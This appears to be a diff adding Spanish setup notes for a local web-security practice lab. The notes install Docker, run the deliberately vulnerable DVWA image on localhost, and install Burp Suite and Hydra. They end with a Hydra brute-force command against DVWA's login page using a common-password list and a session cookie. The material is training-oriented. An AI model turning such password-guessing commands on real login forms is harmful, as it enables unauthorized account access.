@@ -1,0 +1,44 @@
+------INSTALACIÓN DOCKER------
+https://www.hostinger.es/tutoriales/como-instalar-y-usar-docker-en-ubuntu
+sudo apt update
+sudo apt upgrade
+sudo apt-get install curl apt-transport-https ca-certificates software-properties-common
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
+sudo apt update
+apt-cache policy docker-ce
+sudo apt install docker-ce
+sudo systemctl status docker
+
+
+------INSTALACION IMAGEN DVWA------
+https://danielmaldonado.com.ar/seguridad/ejecutar-dvwa-en-docker/
+sudo docker search web-dvwa
+sudo docker pull vulnerables/web-dvwa
+sudo docker run --rm -it -p 8080:80 vulnerables/web-dvwa
+Pagina en: http://127.0.0.1:8080
+Credenciales: -user: admin -password: password
+
+
+------INSTALACIÓN BURPSUITE------
+https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install
+Descargar archivo de community edition
+sudo sh burpsuite_community_linux_v2023_9_4.sh
+
+
+------INSTALACIÓN HYDRA------
+https://www.cibertip.com/tutoriales/como-instalar-hydra-la-famosa-herramienta-de-ciberseguridad-y-pentesting/
+sudo apt-get update
+sudo apt install -y python php curl wget git nano 
+cd $HOME
+sudo git clone https://github.com/vanhauser-thc/thc-hydra
+cd $HOME/thc-hydra
+sudo ./configure
+sudo make
+sudo make install
+hydra -L users.txt -P 500-worst-passwords.txt "http-get-form://127.0.0.1:8080/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=cppmrvlov8l24bia9tcnh1haa7; security=low;:F=Username and/or password incorrect." -I
+
+
+------CONTRASEÑAS------
+https://github.com/danielmiessler/SecLists/blob/master/Passwords/500-worst-passwords.txt
+
